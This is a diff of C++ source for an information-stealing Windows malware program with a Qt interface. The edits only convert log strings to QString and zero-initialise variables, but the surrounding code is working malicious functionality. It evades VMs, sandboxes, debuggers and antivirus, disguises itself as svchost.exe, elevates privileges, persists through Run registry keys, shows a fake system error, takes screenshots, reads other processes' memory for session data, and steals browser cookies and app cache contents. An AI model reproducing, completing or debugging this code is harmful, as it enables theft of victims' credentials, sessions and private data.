@@ -145,7 +145,7 @@ std::string DecryptData(const std::string& encryptedData) {
 
     if (key1.empty() || key2.empty() || salt.empty()) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Decryption keys or salt are empty");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Decryption keys or salt are empty"));
         return "";
     }
 
@@ -173,7 +173,7 @@ std::string DecryptData(const std::string& encryptedData) {
     status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
     if (!BCRYPT_SUCCESS(status)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to open AES algorithm provider for decryption: " + std::to_string(status));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open AES algorithm provider for decryption: " + std::to_string(status)));
         return "";
     }
 
@@ -182,7 +182,7 @@ std::string DecryptData(const std::string& encryptedData) {
     if (!BCRYPT_SUCCESS(status)) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to set chaining mode for decryption: " + std::to_string(status));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to set chaining mode for decryption: " + std::to_string(status)));
         return "";
     }
 
@@ -191,7 +191,7 @@ std::string DecryptData(const std::string& encryptedData) {
     if (!BCRYPT_SUCCESS(status)) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to generate symmetric key for decryption: " + std::to_string(status));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to generate symmetric key for decryption: " + std::to_string(status)));
         return "";
     }
 
@@ -202,7 +202,7 @@ std::string DecryptData(const std::string& encryptedData) {
         BCryptDestroyKey(hKey);
         BCryptCloseAlgorithmProvider(hAlg, 0);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to calculate decrypted data size: " + std::to_string(status));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to calculate decrypted data size: " + std::to_string(status)));
         return "";
     }
 
@@ -212,7 +212,7 @@ std::string DecryptData(const std::string& encryptedData) {
         BCryptDestroyKey(hKey);
         BCryptCloseAlgorithmProvider(hAlg, 0);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to decrypt data: " + std::to_string(status));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to decrypt data: " + std::to_string(status)));
         return "";
     }
 
@@ -229,14 +229,14 @@ bool CheckVirtualEnvironment() {
     // Проверка реестра на наличие идентификаторов виртуальных машин
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        char value[256];
+        char value[256] = {0};
         DWORD size = sizeof(value);
         if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
             std::string identifier(value);
             if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                 identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("VM detected via SCSI identifier: " + identifier);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("VM detected via SCSI identifier: " + identifier));
                 isVM = true;
             }
         }
@@ -246,34 +246,35 @@ bool CheckVirtualEnvironment() {
     // Проверка наличия модулей песочницы или отладчика
     if (GetModuleHandleA("SbieDll.dll")) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Sandboxie detected (SbieDll.dll)");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Sandboxie detected (SbieDll.dll)"));
         isVM = true;
     }
     if (GetModuleHandleA("dbghelp.dll")) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Debugger detected (dbghelp.dll)");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Debugger detected (dbghelp.dll)"));
         isVM = true;
     }
 
     // Проверка системной информации
-    SYSTEM_INFO sysInfo;
+    SYSTEM_INFO sysInfo = {0};
     GetSystemInfo(&sysInfo);
     if (sysInfo.dwNumberOfProcessors <= 2) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors)));
         isVM = true;
     }
 
-    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
+    MEMORYSTATUSEX memStatus = {0};
+    memStatus.dwLength = sizeof(memStatus);
     GlobalMemoryStatusEx(&memStatus);
     if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB");
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB"));
         isVM = true;
     }
 
     // Проверка времени выполнения
-    LARGE_INTEGER freq, start, end;
+    LARGE_INTEGER freq = {0}, start = {0}, end = {0};
     QueryPerformanceFrequency(&freq);
     QueryPerformanceCounter(&start);
     for (volatile int i = 0; i < 100000; i++);
@@ -281,7 +282,7 @@ bool CheckVirtualEnvironment() {
     double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
     if (elapsed > 50) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Suspicious execution time detected: " + std::to_string(elapsed) + " ms");
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms"));
         isVM = true;
     }
 
@@ -304,7 +305,7 @@ bool CheckVirtualEnvironment() {
                 mac.find("00-05-69") != std::string::npos || // VMware
                 mac.find("08-00-27") != std::string::npos) { // VirtualBox
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("VM MAC address detected: " + mac);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("VM MAC address detected: " + mac));
                 isVM = true;
             }
         }
@@ -316,7 +317,7 @@ bool CheckVirtualEnvironment() {
         std::string driverPath = "C:\\Windows\\System32\\drivers\\" + std::string(vmDrivers[i]);
         if (std::filesystem::exists(driverPath)) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("VM driver detected: " + std::string(vmDrivers[i]));
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("VM driver detected: " + std::string(vmDrivers[i])));
             isVM = true;
         }
     }
@@ -328,7 +329,7 @@ bool CheckVirtualEnvironment() {
 bool CheckDebuggerOrAntivirus() {
     if (IsDebuggerPresent()) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Debugger detected via IsDebuggerPresent");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Debugger detected via IsDebuggerPresent"));
         return true;
     }
 
@@ -336,14 +337,14 @@ bool CheckDebuggerOrAntivirus() {
     pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
         GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
     if (NtQueryInformationThread) {
-        THREAD_BASIC_INFORMATION tbi;
+        THREAD_BASIC_INFORMATION tbi = {0};
         NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
         if (tbi.TebBaseAddress) {
             DWORD debugPort = 0;
             NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
             if (debugPort != 0) {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Debugger detected via NtQueryInformationThread");
+                if (g_mainWindow) g_mainWindow->appendLog(QString("Debugger detected via NtQueryInformationThread"));
                 return true;
             }
         }
@@ -356,11 +357,12 @@ bool CheckDebuggerOrAntivirus() {
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for AV check");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create process snapshot for AV check"));
         return false;
     }
 
-    PROCESSENTRY32W pe32 = { sizeof(pe32) };
+    PROCESSENTRY32W pe32 = {0};
+    pe32.dwSize = sizeof(pe32);
     bool avDetected = false;
     if (Process32FirstW(hProcessSnap, &pe32)) {
         do {
@@ -368,7 +370,7 @@ bool CheckDebuggerOrAntivirus() {
                 std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                 if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Antivirus process detected: " + std::string(avProcesses[i]));
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Antivirus process detected: " + std::string(avProcesses[i])));
                     avDetected = true;
                     break;
                 }
@@ -385,17 +387,17 @@ bool AntiAnalysis() {
 
     if (g_mainWindow->config.antiVM && CheckVirtualEnvironment()) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Virtual machine detected, exiting");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Virtual machine detected, exiting"));
         return true;
     }
 
     if (CheckDebuggerOrAntivirus()) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Debugger or Antivirus detected, exiting");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Debugger or Antivirus detected, exiting"));
         return true;
     }
 
-    LARGE_INTEGER freq, start, end;
+    LARGE_INTEGER freq = {0}, start = {0}, end = {0};
     QueryPerformanceFrequency(&freq);
     QueryPerformanceCounter(&start);
     for (volatile int i = 0; i < 1000000; i++);
@@ -403,13 +405,14 @@ bool AntiAnalysis() {
     double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
     if (elapsed > 100) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting");
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting"));
         return true;
     }
 
     HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (hThreadSnap != INVALID_HANDLE_VALUE) {
-        THREADENTRY32 te32 = { sizeof(te32) };
+        THREADENTRY32 te32 = {0};
+        te32.dwSize = sizeof(te32);
         int threadCount = 0;
         if (Thread32First(hThreadSnap, &te32)) {
             do {
@@ -419,17 +422,20 @@ bool AntiAnalysis() {
         CloseHandle(hThreadSnap);
         if (threadCount > 50) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("Too many threads detected: " + std::to_string(threadCount) + ", exiting");
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Too many threads detected: " + std::to_string(threadCount) + ", exiting"));
             return true;
         }
+    } else {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create thread snapshot for anti-analysis"));
     }
 
-    char processName[MAX_PATH];
+    char processName[MAX_PATH] = {0};
     GetModuleFileNameA(nullptr, processName, MAX_PATH);
     std::string procName = std::filesystem::path(processName).filename().string();
     if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Suspicious process name detected: " + procName + ", exiting");
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Suspicious process name detected: " + procName + ", exiting"));
         return true;
     }
 
@@ -440,7 +446,7 @@ bool AntiAnalysis() {
 void MaskProcess() {
     HANDLE hProcess = GetCurrentProcess();
     SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
-    wchar_t systemPath[MAX_PATH];
+    wchar_t systemPath[MAX_PATH] = {0};
     GetSystemDirectoryW(systemPath, MAX_PATH);
     wcscat_s(systemPath, L"\\svchost.exe");
     SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
@@ -452,10 +458,10 @@ void MaskProcess() {
         wchar_t fakeName[] = L"svchost.exe";
         NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Process masked as svchost.exe");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Process masked as svchost.exe"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to mask process");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to mask process"));
     }
 }
 
@@ -466,18 +472,19 @@ void Stealth() {
     SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     MaskProcess();
 
-    HANDLE hToken;
+    HANDLE hToken = nullptr;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
-        TOKEN_PRIVILEGES tp = { 1 };
+        TOKEN_PRIVILEGES tp = {0};
+        tp.PrivilegeCount = 1;
         LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
         CloseHandle(hToken);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Privileges elevated");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Privileges elevated"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to elevate privileges");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to elevate privileges"));
     }
 }
 
@@ -487,15 +494,15 @@ void AddToStartup() {
 
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        char path[MAX_PATH];
+        char path[MAX_PATH] = {0};
         GetModuleFileNameA(nullptr, path, MAX_PATH);
         RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
         RegCloseKey(hKey);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Added to startup (HKEY_CURRENT_USER)");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Added to startup (HKEY_CURRENT_USER)"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to add to startup (HKEY_CURRENT_USER)");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to add to startup (HKEY_CURRENT_USER)"));
     }
 }
 
@@ -506,15 +513,15 @@ void Persist() {
     AddToStartup();
     HKEY hKey;
     if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
-        char path[MAX_PATH];
+        char path[MAX_PATH] = {0};
         GetModuleFileNameA(nullptr, path, MAX_PATH);
         RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
         RegCloseKey(hKey);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Persisted in HKEY_LOCAL_MACHINE");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Persisted in HKEY_LOCAL_MACHINE"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to persist (HKEY_LOCAL_MACHINE)");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to persist (HKEY_LOCAL_MACHINE)"));
     }
 }
 
@@ -524,7 +531,7 @@ void FakeError() {
 
     MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
     std::lock_guard<std::mutex> lock(g_mutex);
-    if (g_mainWindow) g_mainWindow->appendLog("Displayed fake error message");
+    if (g_mainWindow) g_mainWindow->appendLog(QString("Displayed fake error message"));
 }
 
 // Получение системной информации
@@ -532,42 +539,44 @@ std::string GetCustomSystemInfo() {
     if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";
 
     std::string result;
-    char username[256];
+    char username[256] = {0};
     DWORD usernameLen = sizeof(username);
     if (GetUserNameA(username, &usernameLen)) {
         result += "Username: " + std::string(username) + "\n";
     } else {
         result += "Username: Unknown\n";
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get username");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get username"));
     }
 
-    char computerName[256];
+    char computerName[256] = {0};
     DWORD computerNameLen = sizeof(computerName);
     if (GetComputerNameA(computerName, &computerNameLen)) {
         result += "Computer Name: " + std::string(computerName) + "\n";
     } else {
         result += "Computer Name: Unknown\n";
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get computer name");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get computer name"));
     }
 
-    SYSTEM_INFO sysInfo;
+    SYSTEM_INFO sysInfo = {0};
     GetSystemInfo(&sysInfo);
     result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
     result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";
 
-    MEMORYSTATUSEX memInfo = { sizeof(memInfo) };
+    MEMORYSTATUSEX memInfo = {0};
+    memInfo.dwLength = sizeof(memInfo);
     if (GlobalMemoryStatusEx(&memInfo)) {
         result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
         result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
     } else {
         result += "Memory Info: Unknown\n";
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get memory info");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get memory info"));
     }
 
-    OSVERSIONINFOA osInfo = { sizeof(osInfo) };
+    OSVERSIONINFOA osInfo = {0};
+    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
 #pragma warning(suppress: 4996)
     if (GetVersionExA(&osInfo)) {
         result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
@@ -575,7 +584,7 @@ std::string GetCustomSystemInfo() {
     } else {
         result += "OS Info: Unknown\n";
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get OS version");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get OS version"));
     }
 
     ULONG bufferSize = 15000;
@@ -597,7 +606,7 @@ std::string GetCustomSystemInfo() {
     } else {
         result += "Network Info: Unknown\n";
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get network adapters info");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get network adapters info"));
     }
 
     return result;
@@ -610,7 +619,7 @@ std::string TakeScreenshot() {
     HDC hScreenDC = GetDC(nullptr);
     if (!hScreenDC) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get screen DC");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get screen DC"));
         return "";
     }
 
@@ -618,7 +627,7 @@ std::string TakeScreenshot() {
     if (!hMemoryDC) {
         ReleaseDC(nullptr, hScreenDC);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create memory DC");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create memory DC"));
         return "";
     }
 
@@ -629,7 +638,7 @@ std::string TakeScreenshot() {
         DeleteDC(hMemoryDC);
         ReleaseDC(nullptr, hScreenDC);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create bitmap");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create bitmap"));
         return "";
     }
 
@@ -643,7 +652,7 @@ std::string TakeScreenshot() {
         ReleaseDC(nullptr, hScreenDC);
         DeleteObject(hBitmap);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get JPEG CLSID");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get JPEG CLSID"));
         return "";
     }
 
@@ -653,10 +662,10 @@ std::string TakeScreenshot() {
     if (FAILED(hr)) {
         screenshotName.clear();
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to save screenshot");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to save screenshot"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Screenshot saved: " + screenshotName);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Screenshot saved: " + screenshotName));
     }
 
     DeleteDC(hMemoryDC);
@@ -667,7 +676,7 @@ std::string TakeScreenshot() {
 
 // Дешифрование данных Chromium
 std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
-    DATA_BLOB decryptedData;
+    DATA_BLOB decryptedData = {0};
     if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
         std::string result((char*)decryptedData.pbData, decryptedData.cbData);
         LocalFree(decryptedData.pbData);
@@ -675,7 +684,7 @@ std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
     }
 
     std::lock_guard<std::mutex> lock(g_mutex);
-    if (g_mainWindow) g_mainWindow->appendLog("Failed to decrypt Chromium data: " + std::to_string(GetLastError()));
+    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to decrypt Chromium data: " + std::to_string(GetLastError())));
     return "";
 }
 
@@ -685,19 +694,20 @@ std::string CaptureWebSocketSessions(const std::string& processName) {
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebSocket capture");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create process snapshot for WebSocket capture"));
         return result;
     }
 
-    PROCESSENTRY32W pe32 = { sizeof(pe32) };
+    PROCESSENTRY32W pe32 = {0};
+    pe32.dwSize = sizeof(pe32);
     if (Process32FirstW(hProcessSnap, &pe32)) {
         do {
             if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                 HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                 if (hProcess) {
-                    char buffer[4096];
-                    SIZE_T bytesRead;
-                    MEMORY_BASIC_INFORMATION mbi;
+                    char buffer[4096] = {0};
+                    SIZE_T bytesRead = 0;
+                    MEMORY_BASIC_INFORMATION mbi = {0};
                     LPVOID address = 0;
                     while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                         if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
@@ -741,19 +751,20 @@ std::string CaptureWebRTCSessions(const std::string& processName) {
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebRTC capture");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create process snapshot for WebRTC capture"));
         return result;
     }
 
-    PROCESSENTRY32W pe32 = { sizeof(pe32) };
+    PROCESSENTRY32W pe32 = {0};
+    pe32.dwSize = sizeof(pe32);
     if (Process32FirstW(hProcessSnap, &pe32)) {
         do {
             if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                 HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                 if (hProcess) {
-                    char buffer[4096];
-                    SIZE_T bytesRead;
-                    MEMORY_BASIC_INFORMATION mbi;
+                    char buffer[4096] = {0};
+                    SIZE_T bytesRead = 0;
+                    MEMORY_BASIC_INFORMATION mbi = {0};
                     LPVOID address = 0;
                     while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                         if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
@@ -790,7 +801,7 @@ std::string StealUnsavedBrowserData(const std::string& browserName, const std::s
     std::string result;
     if (!std::filesystem::exists(cachePath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Cache path not found for " + browserName + ": " + cachePath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Cache path not found for " + browserName + ": " + cachePath));
         return result;
     }
 
@@ -800,7 +811,7 @@ std::string StealUnsavedBrowserData(const std::string& browserName, const std::s
                 std::ifstream file(entry.path(), std::ios::binary);
                 if (!file.is_open()) {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open cache file for " + browserName + ": " + entry.path().string());
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open cache file for " + browserName + ": " + entry.path().string()));
                     continue;
                 }
 
@@ -839,7 +850,7 @@ std::string StealUnsavedBrowserData(const std::string& browserName, const std::s
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what());
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what()));
     }
 
     return result;
@@ -850,7 +861,7 @@ std::string StealAppCacheData(const std::string& appName, const std::string& cac
     std::string result;
     if (!std::filesystem::exists(cachePath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Cache path not found for " + appName + ": " + cachePath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Cache path not found for " + appName + ": " + cachePath));
         return result;
     }
 
@@ -860,7 +871,7 @@ std::string StealAppCacheData(const std::string& appName, const std::string& cac
                 std::ifstream file(entry.path(), std::ios::binary);
                 if (!file.is_open()) {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open cache file for " + appName + ": " + entry.path().string());
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open cache file for " + appName + ": " + entry.path().string()));
                     continue;
                 }
 
@@ -892,7 +903,7 @@ std::string StealAppCacheData(const std::string& appName, const std::string& cac
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error in StealAppCacheData for " + appName + ": " + e.what());
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error in StealAppCacheData for " + appName + ": " + e.what()));
     }
 
     return result;
@@ -910,13 +921,13 @@ std::string StealChromiumData(const std::string& browserName, const std::string&
     // Кража cookies
     if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
         if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
-            sqlite3_stmt* stmt;
+            sqlite3_stmt* stmt = nullptr;
             const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
             if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                 while (sqlite3_step(stmt) == SQLITE_ROW) {
                     std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                     std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
